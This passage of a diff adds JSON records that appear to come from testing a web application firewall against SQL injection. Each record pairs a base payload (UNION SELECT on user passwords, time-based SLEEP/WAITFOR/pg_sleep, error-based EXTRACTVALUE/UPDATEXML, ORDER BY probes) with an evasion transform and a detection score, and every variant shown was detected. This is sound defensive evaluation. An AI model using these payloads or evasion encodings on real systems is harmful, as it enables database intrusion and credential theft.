+"transform": "null_byte_suffix",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1 UNION SELECT username,password FROM users",
+"transformed": "0x3120554e494f4e2053454c45435420757365726e",
+"transform": "hex_encode",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1 UNION SELECT 1,2,3 FROM information_schema.tables",
+"transformed": "1 UNION SELECT 1,2,3 FROM information_schema.tables",
+"transform": "identity",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1 UNION SELECT 1,2,3 FROM information_schema.tables",
+"transformed": "1%20UNION%20SELECT%201%2C2%2C3%20FROM%20information_schema.tables",
+"transform": "url_encode",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1 UNION SELECT 1,2,3 FROM information_schema.tables",
+"transformed": "1%2520UNION%2520SELECT%25201%252C2%252C3%2520FROM%2520information_schema.tables",
+"transform": "double_url_encode",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1 UNION SELECT 1,2,3 FROM information_schema.tables",
+"transformed": "1 UnIoN SeLeCt 1,2,3 fRoM InFoRmAtIoN_ScHeMa.tAbLeS",
+"transform": "case_mix",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1 UNION SELECT 1,2,3 FROM information_schema.tables",
+"transformed": "1 UNION SELECT 1,2,3 FROM infORmation_schema.tables",
+"transform": "case_upper_keywords",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1 UNION SELECT 1,2,3 FROM information_schema.tables",
+"transformed": "1/**/UNION/**/SELECT/**/1,2,3/**/FROM/**/information_schema.tables",
+"transform": "comment_inline_mysql",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1 UNION SELECT 1,2,3 FROM information_schema.tables",
+"transformed": "1#UNION#SELECT#1,2,3#FROM#information_schema.tables",
+"transform": "comment_inline_hash",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1 UNION SELECT 1,2,3 FROM information_schema.tables",
+"transformed": "1/*x*/UNION/*x*/SELECT/*x*/1,2,3/*x*/FROM/*x*/information_schema.tables",
+"transform": "comment_slash_star",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1 UNION SELECT 1,2,3 FROM information_schema.tables",
+"transformed": "1+UNION+SELECT+1,2,3+FROM+information_schema.tables",
+"transform": "plus_for_space",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1 UNION SELECT 1,2,3 FROM information_schema.tables",
+"transformed": "1\tUNION\tSELECT\t1,2,3\tFROM\tinformation_schema.tables",
+"transform": "tab_for_space",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1 UNION SELECT 1,2,3 FROM information_schema.tables",
+"transformed": "1 UNION SELECT 1,2,3 FROM information_schema.tables%00",
+"transform": "null_byte_suffix",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1 UNION SELECT 1,2,3 FROM information_schema.tables",
+"transformed": "0x3120554e494f4e2053454c45435420312c322c33",
+"transform": "hex_encode",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' AND 1=0 UNION SELECT NULL,version()--",
+"transformed": "1' AND 1=0 UNION SELECT NULL,version()--",
+"transform": "identity",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' AND 1=0 UNION SELECT NULL,version()--",
+"transformed": "1%27%20AND%201%3D0%20UNION%20SELECT%20NULL%2Cversion%28%29--",
+"transform": "url_encode",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' AND 1=0 UNION SELECT NULL,version()--",
+"transformed": "1%2527%2520AND%25201%253D0%2520UNION%2520SELECT%2520NULL%252Cversion%2528%2529--",
+"transform": "double_url_encode",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' AND 1=0 UNION SELECT NULL,version()--",
+"transformed": "1' aNd 1=0 uNiOn sElEcT NuLl,vErSiOn()--",
+"transform": "case_mix",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' AND 1=0 UNION SELECT NULL,version()--",
+"transformed": "1'/**/AND/**/1=0/**/UNION/**/SELECT/**/NULL,version()--",
+"transform": "comment_inline_mysql",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' AND 1=0 UNION SELECT NULL,version()--",
+"transformed": "1'#AND#1=0#UNION#SELECT#NULL,version()--",
+"transform": "comment_inline_hash",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' AND 1=0 UNION SELECT NULL,version()--",
+"transformed": "1'/*x*/AND/*x*/1=0/*x*/UNION/*x*/SELECT/*x*/NULL,version()--",
+"transform": "comment_slash_star",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' AND 1=0 UNION SELECT NULL,version()--",
+"transformed": "1'+AND+1=0+UNION+SELECT+NULL,version()--",
+"transform": "plus_for_space",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' AND 1=0 UNION SELECT NULL,version()--",
+"transformed": "1'\tAND\t1=0\tUNION\tSELECT\tNULL,version()--",
+"transform": "tab_for_space",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' AND 1=0 UNION SELECT NULL,version()--",
+"transformed": "1' AND 1=0 UNION SELECT NULL,version()--%00",
+"transform": "null_byte_suffix",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' AND 1=0 UNION SELECT NULL,version()--",
+"transformed": "0x312720414e4420313d3020554e494f4e2053454c",
+"transform": "hex_encode",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' AND SLEEP(5)--",
+"transformed": "1' AND SLEEP(5)--",
+"transform": "identity",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' AND SLEEP(5)--",
+"transformed": "1%27%20AND%20SLEEP%285%29--",
+"transform": "url_encode",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' AND SLEEP(5)--",
+"transformed": "1%2527%2520AND%2520SLEEP%25285%2529--",
+"transform": "double_url_encode",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' AND SLEEP(5)--",
+"transformed": "1' aNd sLeEp(5)--",
+"transform": "case_mix",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' AND SLEEP(5)--",
+"transformed": "1'/**/AND/**/SLEEP(5)--",
+"transform": "comment_inline_mysql",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' AND SLEEP(5)--",
+"transformed": "1'#AND#SLEEP(5)--",
+"transform": "comment_inline_hash",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' AND SLEEP(5)--",
+"transformed": "1'/*x*/AND/*x*/SLEEP(5)--",
+"transform": "comment_slash_star",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' AND SLEEP(5)--",
+"transformed": "1'+AND+SLEEP(5)--",
+"transform": "plus_for_space",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' AND SLEEP(5)--",
+"transformed": "1'\tAND\tSLEEP(5)--",
+"transform": "tab_for_space",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' AND SLEEP(5)--",
+"transformed": "1' AND SLEEP(5)--%00",
+"transform": "null_byte_suffix",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' AND SLEEP(5)--",
+"transformed": "0x312720414e4420534c4545502835292d2d",
+"transform": "hex_encode",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' AND SLEEP(5)#",
+"transformed": "1' AND SLEEP(5)#",
+"transform": "identity",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' AND SLEEP(5)#",
+"transformed": "1%27%20AND%20SLEEP%285%29%23",
+"transform": "url_encode",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' AND SLEEP(5)#",
+"transformed": "1%2527%2520AND%2520SLEEP%25285%2529%2523",
+"transform": "double_url_encode",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' AND SLEEP(5)#",
+"transformed": "1' aNd sLeEp(5)#",
+"transform": "case_mix",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' AND SLEEP(5)#",
+"transformed": "1'/**/AND/**/SLEEP(5)#",
+"transform": "comment_inline_mysql",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' AND SLEEP(5)#",
+"transformed": "1'#AND#SLEEP(5)#",
+"transform": "comment_inline_hash",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' AND SLEEP(5)#",
+"transformed": "1'/*x*/AND/*x*/SLEEP(5)#",
+"transform": "comment_slash_star",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' AND SLEEP(5)#",
+"transformed": "1'+AND+SLEEP(5)#",
+"transform": "plus_for_space",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' AND SLEEP(5)#",
+"transformed": "1'\tAND\tSLEEP(5)#",
+"transform": "tab_for_space",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' AND SLEEP(5)#",
+"transformed": "1' AND SLEEP(5)#%00",
+"transform": "null_byte_suffix",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' AND SLEEP(5)#",
+"transformed": "0x312720414e4420534c45455028352923",
+"transform": "hex_encode",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1'; WAITFOR DELAY '0:0:5'--",
+"transformed": "1'; WAITFOR DELAY '0:0:5'--",
+"transform": "identity",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1'; WAITFOR DELAY '0:0:5'--",
+"transformed": "1%27%3B%20WAITFOR%20DELAY%20%270%3A0%3A5%27--",
+"transform": "url_encode",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1'; WAITFOR DELAY '0:0:5'--",
+"transformed": "1%2527%253B%2520WAITFOR%2520DELAY%2520%25270%253A0%253A5%2527--",
+"transform": "double_url_encode",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1'; WAITFOR DELAY '0:0:5'--",
+"transformed": "1'; WaItFoR DeLaY '0:0:5'--",
+"transform": "case_mix",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1'; WAITFOR DELAY '0:0:5'--",
+"transformed": "1';/**/WAITFOR/**/DELAY/**/'0:0:5'--",
+"transform": "comment_inline_mysql",
+"waf_score": 0.99,
+"bypass": 0
+},
+{
+"base": "1'; WAITFOR DELAY '0:0:5'--",
+"transformed": "1';#WAITFOR#DELAY#'0:0:5'--",
+"transform": "comment_inline_hash",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1'; WAITFOR DELAY '0:0:5'--",
+"transformed": "1';/*x*/WAITFOR/*x*/DELAY/*x*/'0:0:5'--",
+"transform": "comment_slash_star",
+"waf_score": 0.98,
+"bypass": 0
+},
+{
+"base": "1'; WAITFOR DELAY '0:0:5'--",
+"transformed": "1';+WAITFOR+DELAY+'0:0:5'--",
+"transform": "plus_for_space",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1'; WAITFOR DELAY '0:0:5'--",
+"transformed": "1';\tWAITFOR\tDELAY\t'0:0:5'--",
+"transform": "tab_for_space",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1'; WAITFOR DELAY '0:0:5'--",
+"transformed": "1'; WAITFOR DELAY '0:0:5'--%00",
+"transform": "null_byte_suffix",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1'; WAITFOR DELAY '0:0:5'--",
+"transformed": "0x31273b2057414954464f522044454c4159202730",
+"transform": "hex_encode",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' OR BENCHMARK(10000000,SHA1(1))--",
+"transformed": "1' OR BENCHMARK(10000000,SHA1(1))--",
+"transform": "identity",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' OR BENCHMARK(10000000,SHA1(1))--",
+"transformed": "1%27%20OR%20BENCHMARK%2810000000%2CSHA1%281%29%29--",
+"transform": "url_encode",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' OR BENCHMARK(10000000,SHA1(1))--",
+"transformed": "1%2527%2520OR%2520BENCHMARK%252810000000%252CSHA1%25281%2529%2529--",
+"transform": "double_url_encode",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' OR BENCHMARK(10000000,SHA1(1))--",
+"transformed": "1' oR BeNcHmArK(10000000,sHa1(1))--",
+"transform": "case_mix",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' OR BENCHMARK(10000000,SHA1(1))--",
+"transformed": "1'/**/OR/**/BENCHMARK(10000000,SHA1(1))--",
+"transform": "comment_inline_mysql",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' OR BENCHMARK(10000000,SHA1(1))--",
+"transformed": "1'#OR#BENCHMARK(10000000,SHA1(1))--",
+"transform": "comment_inline_hash",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' OR BENCHMARK(10000000,SHA1(1))--",
+"transformed": "1'/*x*/OR/*x*/BENCHMARK(10000000,SHA1(1))--",
+"transform": "comment_slash_star",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' OR BENCHMARK(10000000,SHA1(1))--",
+"transformed": "1'+OR+BENCHMARK(10000000,SHA1(1))--",
+"transform": "plus_for_space",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' OR BENCHMARK(10000000,SHA1(1))--",
+"transformed": "1'\tOR\tBENCHMARK(10000000,SHA1(1))--",
+"transform": "tab_for_space",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' OR BENCHMARK(10000000,SHA1(1))--",
+"transformed": "1' OR BENCHMARK(10000000,SHA1(1))--%00",
+"transform": "null_byte_suffix",
+"waf_score": 0.99,
+"bypass": 0
+},
+{
+"base": "1' OR BENCHMARK(10000000,SHA1(1))--",
+"transformed": "0x3127204f522042454e43484d41524b2831303030",
+"transform": "hex_encode",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' OR pg_sleep(5)--",
+"transformed": "1' OR pg_sleep(5)--",
+"transform": "identity",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' OR pg_sleep(5)--",
+"transformed": "1%27%20OR%20pg_sleep%285%29--",
+"transform": "url_encode",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' OR pg_sleep(5)--",
+"transformed": "1%2527%2520OR%2520pg_sleep%25285%2529--",
+"transform": "double_url_encode",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' OR pg_sleep(5)--",
+"transformed": "1' oR Pg_sLeEp(5)--",
+"transform": "case_mix",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' OR pg_sleep(5)--",
+"transformed": "1' OR pg_SLEEP(5)--",
+"transform": "case_upper_keywords",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' OR pg_sleep(5)--",
+"transformed": "1'/**/OR/**/pg_sleep(5)--",
+"transform": "comment_inline_mysql",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' OR pg_sleep(5)--",
+"transformed": "1'#OR#pg_sleep(5)--",
+"transform": "comment_inline_hash",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' OR pg_sleep(5)--",
+"transformed": "1'/*x*/OR/*x*/pg_sleep(5)--",
+"transform": "comment_slash_star",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' OR pg_sleep(5)--",
+"transformed": "1'+OR+pg_sleep(5)--",
+"transform": "plus_for_space",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' OR pg_sleep(5)--",
+"transformed": "1'\tOR\tpg_sleep(5)--",
+"transform": "tab_for_space",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' OR pg_sleep(5)--",
+"transformed": "1' OR pg_sleep(5)--%00",
+"transform": "null_byte_suffix",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' OR pg_sleep(5)--",
+"transformed": "0x3127204f522070675f736c6565702835292d2d",
+"transform": "hex_encode",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--",
+"transformed": "1' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--",
+"transform": "identity",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--",
+"transformed": "1%27%20AND%20EXTRACTVALUE%281%2CCONCAT%280x7e%2Cversion%28%29%29%29--",
+"transform": "url_encode",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--",
+"transformed": "1%2527%2520AND%2520EXTRACTVALUE%25281%252CCONCAT%25280x7e%252Cversion%2528%2529%2529%2529--",
+"transform": "double_url_encode",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--",
+"transformed": "1' aNd eXtRaCtVaLuE(1,CoNcAt(0X7E,VeRsIoN()))--",
+"transform": "case_mix",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--",
+"transformed": "1'/**/AND/**/EXTRACTVALUE(1,CONCAT(0x7e,version()))--",
+"transform": "comment_inline_mysql",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--",
+"transformed": "1'#AND#EXTRACTVALUE(1,CONCAT(0x7e,version()))--",
+"transform": "comment_inline_hash",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--",
+"transformed": "1'/*x*/AND/*x*/EXTRACTVALUE(1,CONCAT(0x7e,version()))--",
+"transform": "comment_slash_star",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--",
+"transformed": "1'+AND+EXTRACTVALUE(1,CONCAT(0x7e,version()))--",
+"transform": "plus_for_space",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--",
+"transformed": "1'\tAND\tEXTRACTVALUE(1,CONCAT(0x7e,version()))--",
+"transform": "tab_for_space",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--",
+"transformed": "1' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--%00",
+"transform": "null_byte_suffix",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--",
+"transformed": "0x312720414e44204558545241435456414c554528",
+"transform": "hex_encode",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' AND UPDATEXML(1,CONCAT(0x7e,version()),1)--",
+"transformed": "1' AND UPDATEXML(1,CONCAT(0x7e,version()),1)--",
+"transform": "identity",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' AND UPDATEXML(1,CONCAT(0x7e,version()),1)--",
+"transformed": "1%27%20AND%20UPDATEXML%281%2CCONCAT%280x7e%2Cversion%28%29%29%2C1%29--",
+"transform": "url_encode",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' AND UPDATEXML(1,CONCAT(0x7e,version()),1)--",
+"transformed": "1%2527%2520AND%2520UPDATEXML%25281%252CCONCAT%25280x7e%252Cversion%2528%2529%2529%252C1%2529--",
+"transform": "double_url_encode",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' AND UPDATEXML(1,CONCAT(0x7e,version()),1)--",
+"transformed": "1' aNd uPdAtExMl(1,cOnCaT(0x7e,vErSiOn()),1)--",
+"transform": "case_mix",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' AND UPDATEXML(1,CONCAT(0x7e,version()),1)--",
+"transformed": "1'/**/AND/**/UPDATEXML(1,CONCAT(0x7e,version()),1)--",
+"transform": "comment_inline_mysql",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' AND UPDATEXML(1,CONCAT(0x7e,version()),1)--",
+"transformed": "1'#AND#UPDATEXML(1,CONCAT(0x7e,version()),1)--",
+"transform": "comment_inline_hash",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' AND UPDATEXML(1,CONCAT(0x7e,version()),1)--",
+"transformed": "1'/*x*/AND/*x*/UPDATEXML(1,CONCAT(0x7e,version()),1)--",
+"transform": "comment_slash_star",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' AND UPDATEXML(1,CONCAT(0x7e,version()),1)--",
+"transformed": "1'+AND+UPDATEXML(1,CONCAT(0x7e,version()),1)--",
+"transform": "plus_for_space",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' AND UPDATEXML(1,CONCAT(0x7e,version()),1)--",
+"transformed": "1'\tAND\tUPDATEXML(1,CONCAT(0x7e,version()),1)--",
+"transform": "tab_for_space",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' AND UPDATEXML(1,CONCAT(0x7e,version()),1)--",
+"transformed": "1' AND UPDATEXML(1,CONCAT(0x7e,version()),1)--%00",
+"transform": "null_byte_suffix",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' AND UPDATEXML(1,CONCAT(0x7e,version()),1)--",
+"transformed": "0x312720414e4420555044415445584d4c28312c43",
+"transform": "hex_encode",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' ORDER BY 1--",
+"transformed": "1' ORDER BY 1--",
+"transform": "identity",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' ORDER BY 1--",
+"transformed": "1%27%20ORDER%20BY%201--",
+"transform": "url_encode",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' ORDER BY 1--",
+"transformed": "1%2527%2520ORDER%2520BY%25201--",
+"transform": "double_url_encode",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' ORDER BY 1--",
+"transformed": "1' oRdEr bY 1--",
+"transform": "case_mix",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' ORDER BY 1--",
+"transformed": "1'/**/ORDER/**/BY/**/1--",
+"transform": "comment_inline_mysql",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' ORDER BY 1--",
+"transformed": "1'#ORDER#BY#1--",
+"transform": "comment_inline_hash",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' ORDER BY 1--",
+"transformed": "1'/*x*/ORDER/*x*/BY/*x*/1--",
+"transform": "comment_slash_star",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' ORDER BY 1--",
+"transformed": "1'+ORDER+BY+1--",
+"transform": "plus_for_space",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' ORDER BY 1--",
+"transformed": "1'\tORDER\tBY\t1--",
+"transform": "tab_for_space",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' ORDER BY 1--",
+"transformed": "1' ORDER BY 1--%00",
+"transform": "null_byte_suffix",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' ORDER BY 1--",
+"transformed": "0x3127204f5244455220425920312d2d",
+"transform": "hex_encode",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' ORDER BY 10--",
+"transformed": "1' ORDER BY 10--",
+"transform": "identity",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' ORDER BY 10--",
+"transformed": "1%27%20ORDER%20BY%2010--",
+"transform": "url_encode",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' ORDER BY 10--",
+"transformed": "1%2527%2520ORDER%2520BY%252010--",
+"transform": "double_url_encode",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' ORDER BY 10--",
+"transformed": "1' oRdEr bY 10--",
+"transform": "case_mix",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' ORDER BY 10--",
+"transformed": "1'/**/ORDER/**/BY/**/10--",
+"transform": "comment_inline_mysql",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' ORDER BY 10--",
+"transformed": "1'#ORDER#BY#10--",
+"transform": "comment_inline_hash",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' ORDER BY 10--",
+"transformed": "1'/*x*/ORDER/*x*/BY/*x*/10--",
+"transform": "comment_slash_star",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' ORDER BY 10--",
+"transformed": "1'+ORDER+BY+10--",
+"transform": "plus_for_space",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' ORDER BY 10--",
+"transformed": "1'\tORDER\tBY\t10--",
+"transform": "tab_for_space",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' ORDER BY 10--",
+"transformed": "1' ORDER BY 10--%00",
+"transform": "null_byte_suffix",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' ORDER BY 10--",
+"transformed": "0x3127204f524445522042592031302d2d",
+"transform": "hex_encode",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' GROUP BY 1--",
+"transformed": "1' GROUP BY 1--",
+"transform": "identity",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' GROUP BY 1--",
+"transformed": "1%27%20GROUP%20BY%201--",
+"transform": "url_encode",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' GROUP BY 1--",
+"transformed": "1%2527%2520GROUP%2520BY%25201--",
+"transform": "double_url_encode",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' GROUP BY 1--",
+"transformed": "1' gRoUp bY 1--",
+"transform": "case_mix",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' GROUP BY 1--",
+"transformed": "1'/**/GROUP/**/BY/**/1--",
+"transform": "comment_inline_mysql",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' GROUP BY 1--",
+"transformed": "1'#GROUP#BY#1--",
+"transform": "comment_inline_hash",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' GROUP BY 1--",
+"transformed": "1'/*x*/GROUP/*x*/BY/*x*/1--",
+"transform": "comment_slash_star",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' GROUP BY 1--",
+"transformed": "1'+GROUP+BY+1--",
+"transform": "plus_for_space",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' GROUP BY 1--",
+"transformed": "1'\tGROUP\tBY\t1--",
+"transform": "tab_for_space",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' GROUP BY 1--",
+"transformed": "1' GROUP BY 1--%00",
+"transform": "null_byte_suffix",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' GROUP BY 1--",
+"transformed": "0x31272047524f555020425920312d2d",
+"transform": "hex_encode",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' HAVING 1=1--",
+"transformed": "1' HAVING 1=1--",
+"transform": "identity",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' HAVING 1=1--",
+"transformed": "1%27%20HAVING%201%3D1--",
+"transform": "url_encode",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' HAVING 1=1--",
+"transformed": "1%2527%2520HAVING%25201%253D1--",
+"transform": "double_url_encode",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' HAVING 1=1--",
+"transformed": "1' hAvInG 1=1--",
+"transform": "case_mix",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' HAVING 1=1--",
+"transformed": "1'/**/HAVING/**/1=1--",
+"transform": "comment_inline_mysql",
+"waf_score": 0.99,
+"bypass": 0
+},
+{
+"base": "1' HAVING 1=1--",
+"transformed": "1'#HAVING#1=1--",
+"transform": "comment_inline_hash",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' HAVING 1=1--",
+"transformed": "1'/*x*/HAVING/*x*/1=1--",
+"transform": "comment_slash_star",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' HAVING 1=1--",
+"transformed": "1'+HAVING+1=1--",
+"transform": "plus_for_space",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' HAVING 1=1--",
+"transformed": "1'\tHAVING\t1=1--",
+"transform": "tab_for_space",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' HAVING 1=1--",
+"transformed": "1' HAVING 1=1--%00",
+"transform": "null_byte_suffix",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' HAVING 1=1--",
+"transformed": "0x312720484156494e4720313d312d2d",
+"transform": "hex_encode",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
+"transformed": "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
+"transform": "identity",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
+"base": "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
+"transformed": "1%27%20AND%20%28SELECT%20%2A%20FROM%20%28SELECT%28SLEEP%285%29%29%29a%29--",
+"transform": "url_encode",
+"waf_score": 1.0,
+"bypass": 0
+},
+{
